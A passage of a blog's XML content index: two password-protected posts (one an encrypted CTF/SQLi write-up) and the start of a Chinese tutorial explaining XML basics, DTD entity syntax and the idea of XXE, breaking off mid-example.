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</div>]]></content>
      
      
      <categories>
          
          <category> SQLi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈 C 和其他语言</title>
      <link href="/post/c-grammer/"/>
      <url>/post/c-grammer/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div>]]></content>
      
      
      <categories>
          
          <category> C&amp;C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE-XML</title>
      <link href="/post/xxe-xml-dtd/"/>
      <url>/post/xxe-xml-dtd/</url>
      
        <content type="html"><![CDATA[<p>最近遇到一些事，使我不得不抓紧时间学习一下XXE相关的漏洞知识<del>~</del></p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">XXE-XML</font> </center><br><br><h3 id="一-XML"><font color="#FF6347" face="Comic sans MS">一. XML</font><a href="post/xxe-xml-dtd#一-XML"></a></h3><h4 id="1-1-基本概念"><font color="#3CB371" face="Comic sans MS">1.1 基本概念</font><a href="post/xxe-xml-dtd#1-1-基本概念"></a></h4><blockquote><ol><li>什么是XML？</li><li>为什么要使用XML？</li><li>怎么使用XML？</li><li>为什么着重强调DTD？</li></ol></blockquote><p><strong>1. XML 是什么？</strong></p><ul><li>指可扩展标记语言（EXtensible Markup Language）。</li><li>是一种很像HTML的标记语言。</li><li>的设计宗旨是传输数据，而不是显示数据。</li><li>标签没有被预定义。您需要自行定义标签。</li><li>被设计为具有自我描述性。</li><li>是 W3C 的推荐标准。</li></ul><p>可以参考：<font color="#00B2EE">[<a href="https://blog.csdn.net/Rain722/article/details/52925828" target="_blank" rel="noopener">XML是什么，它可以做什么？——XML详解</a>]</font><br><br></p><p><strong>2. 为什么要使用XML？</strong><br>参考：<font color="#00B2EE">[<a href="http://www.runoob.com/xml/xml-usage.html" target="_blank" rel="noopener">XML 用途</a>]</font>     </p><p><strong>(1) XML 把数据从 HTML 分离</strong></p><blockquote><ol><li>如果您需要在 HTML 文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑 HTML。</li><li>通过 XML，数据能够存储在独立的 XML 文件中。这样您就可以专注于使用 HTML/CSS 进行显示和布局，并确保修改底层数据不再需要对 HTML 进行任何的改变。</li><li>通过使用几行 JavaScript 代码，您就可以读取一个外部 XML 文件，并更新您的网页的数据内容。</li></ol></blockquote><p><strong>(2 )XML 简化数据共享</strong></p><blockquote><ol><li>在真实的世界中，计算机系统和数据使用不兼容的格式来存储数据。</li><li>XML 数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。</li><li>这让创建不同应用程序可以共享的数据变得更加容易。</li></ol></blockquote><p><strong>(3) XML 简化数据传输</strong></p><blockquote><ol><li>对开发人员来说，其中一项最费时的挑战一直是在互联网上的不兼容系统之间交换数据。</li><li>由于可以通过各种不兼容的应用程序来读取数据，以 XML 交换数据降低了这种复杂性。</li></ol></blockquote><p><strong>(4) XML 简化平台变更</strong></p><blockquote><ol><li>升级到新的系统（硬件或软件平台），总是非常费时的。必须转换大量的数据，不兼容的数据经常会丢失。</li><li>XML 数据以文本格式存储。这使得 XML 在不损失数据的情况下，更容易扩展或升级到新的操作系统、新的应用程序或新的浏览器。</li></ol></blockquote><br>**3. 怎么使用？**<p>可以是这样</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>person</span> <span class="token attr-name">age</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>too young<span class="token punctuation">"</span></span> <span class="token attr-name">experience</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>too simple<span class="token punctuation">"</span></span> <span class="token attr-name">result</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sometimes naive<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以是这样</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>person</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>age</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>too young<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>experience</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>too simple<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sometimes naive<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>person</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还可以这样</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>person</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>age</span><span class="token punctuation">></span></span>too young<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>age</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>experience</span><span class="token punctuation">></span></span>too simple<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>experience</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span><span class="token punctuation">></span></span>sometimes naive<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>person</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是更推荐使用第三种！主流使用的也是第三种。<br><br></p><p><strong>4. 为什么着重强调DTD？</strong></p><p>DTD实体：DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p>实体又分为一般实体和参数实体</p><ol><li>一般实体的声明语法:<code>&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</code><br>引用实体的方式：&amp;实体名；</li><li>参数实体只能在DTD中使用，参数实体的声明格式： <code>&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</code><br>引用实体的方式：%实体名；</li></ol><p>1，何为XXE？<br>答： xxe也就是xml外部实体注入。也就是上述的那一部分。</p><p>2，怎样构建外部实体注入？<br>方式一：直接通过DTD外部实体声明</p><p>可参考：<font color="#00B2EE">[<a href="https://www.cnblogs.com/r00tuser/p/7255939.html" target="_blank" rel="noopener">xxe漏洞的学习与利用总结</a>]</font></p><br><h4 id="1-2-使用XML"><font color="#3CB371" face="Comic sans MS">1.2 使用XML</font><a href="post/xxe-xml-dtd#1-2-使用XML"></a></h4><p><strong>实际写文档一般这样用：（新版本）</strong>可参考<font color="#00B2EE">[<a href="http://www.runoob.com/dtd/dtd-building.html" target="_blank" rel="noopener">XML 文档构建模块</a>]</font></p><blockquote><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li>元素</li><li>属性</li><li>实体   <ul><li><code>&amp;lt;</code>表示<code>&lt;</code></li><li><code>&amp;gt;</code>表示<code>&gt;</code></li><li><code>&amp;amp;</code>表示<code>&amp;</code></li><li><code>&amp;apos;</code>表示<code>&#39;</code></li><li><code>&amp;quot;</code>表示<code>&quot;</code></li></ul></li><li>PCDATA ：被解析的字符数据（parsed character data）</li><li>CDATA  ：不会被解析的字符数据（character data）</li><li>两种文档约束：DTD、Schema</li></ul></blockquote><p>包含上面那几部分以后，文档还要有一个规范来约束，即需要对自己写的文档进行验证， 验证器会对在自己写的验证规则中对XML文件进行语法检查。</p><p><strong>为什么要有约束？</strong><br>因为XML文件的标签和属性可以随意扩展，有时我们必须要限制每个文档有哪些元素，每个元素有哪些子元素，每个元素有哪些属性，属性的值是什么类型等。从而保证XML文档格式和数据的正确性。</p><br><p>实例</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--文档的声明--></span><span class="token comment" spellcheck="true">&lt;!--还有个属性standalone:很少使用，是否是一个单独的XML文件，取值是true或false。默认是true--></span><span class="token comment" spellcheck="true">&lt;!--元素 note、to、from、body等叫做元素，Tove叫做To这个元素的值value，而sex叫做属性，female叫做属性的值--></span><span class="token comment" spellcheck="true">&lt;!--注释和HTML一样--></span><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span> <span class="token attr-name">sex</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>female<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span 